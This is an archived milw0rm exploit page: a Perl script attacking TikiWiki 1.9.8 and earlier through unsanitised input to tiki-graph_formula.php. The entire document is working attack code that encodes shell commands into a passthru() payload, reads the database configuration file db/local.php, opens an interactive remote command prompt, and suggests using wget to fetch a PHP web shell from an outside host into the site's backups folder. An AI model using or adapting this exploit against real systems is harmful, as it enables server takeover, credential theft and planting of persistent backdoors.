<html><head><title>TikiWiki <= 1.9.8 tiki-graph_formula.php Command Execution Exploit</title></head><pre>#!/usr/bin/perl
# TikiWiki &lt;= 1.9.8 Remote Command Execution Exploit
#
# Description
# -----------
# TikiWiki contains a flaw that may allow a remote attacker to execute arbitrary commands. 
# The issue is due to 'tiki-graph_formula.php' script not properly sanitizing user input 
# supplied to the f variable, which may allow a remote attacker to execute arbitrary PHP 
# commands resulting in a loss of integrity.
# -----------
# Vulnerability discovered by ShAnKaR &lt;sec [at] shankar.antichat.ru&gt;
#
# $Id: milw0rm_tikiwiki.pl,v 0.1 2007/10/12 13:25:08 str0ke Exp $

use strict;
use LWP::UserAgent;

my $target = shift || &amp;usage();
my $proxy = shift;
my $command;

&amp;exploit($target, &quot;cat db/local.php&quot;, $proxy);

print &quot;[?] php shell it?\n&quot;;
print &quot;[*] wget http://www.youhost.com/yourshell.txt -O backups/shell.php\n&quot;;
print &quot;[*] lynx &quot; . $target . &quot;/backups/shell.php\n\n&quot;;

while()
{
	print &quot;tiki\# &quot;;
	chomp($command = &lt;STDIN&gt;);
	exit unless $command;
	&amp;exploit($target, $command, $proxy);
}

sub usage()
{
	print &quot;[?] TikiWiki &lt;= 1.9.8 Remote Command Execution Exploit\n&quot;;
	print &quot;[?] str0ke &lt;str0ke[!]milw0rm.com&gt;\n&quot;;
	print &quot;[?] usage: perl $0 [target]\n&quot;;
	print &quot;    [target] (ex. http://127.0.0.1/tikiwiki)\n&quot;;
	print &quot;    [proxy] (ex. 0.0.0.0:8080)\n&quot;;
	exit;
}

sub exploit()
{
	my($target, $command, $proxy) = @_;

	my $cmd = 'echo start_er;'.$command.';'.'echo end_er';
	
	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

	my $conn = LWP::UserAgent-&gt;new() or die;
	$conn-&gt;agent(&quot;Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)&quot;);
	$conn-&gt;proxy(&quot;http&quot;, &quot;http://&quot;.$proxy.&quot;/&quot;) unless !$proxy;
	
	my $out=$conn-&gt;get($target.&quot;/tiki-graph_formula.php?w=1&amp;h=1&amp;s=1&amp;min=1&amp;max=2&amp;f[]=x.tan.passthru($byte).die()&amp;t=png&amp;title=&quot;);

	if ($out-&gt;content =~ m/start_er(.*?)end_er/ms) {
		print $1 . &quot;\n&quot;;
	} else { 
		print &quot;[-] Exploit Failed\n&quot;;
		exit;
	}
}

# milw0rm.com [2007-10-12]</pre></html>